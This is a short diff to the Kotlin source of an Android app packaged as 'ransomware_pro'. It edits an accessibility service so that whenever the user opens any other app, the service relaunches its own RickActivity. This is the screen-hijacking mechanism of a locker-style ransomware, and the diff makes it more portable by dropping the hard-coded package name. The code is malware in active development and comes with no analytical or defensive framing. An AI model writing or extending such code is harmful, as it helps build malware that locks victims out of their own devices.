@@ -11,7 +11,7 @@ import com.example.ransomware_pro.utils.Logger
 class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         Logger.debug("in onAccessibilityEvent "+event?.packageName)
-        if(event?.packageName!="com.example.ransomware_pro"){
+        if(event?.packageName!=applicationContext.packageName){
             val intent:Intent= Intent(this, RickActivity::class.java)
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             startActivity(intent)
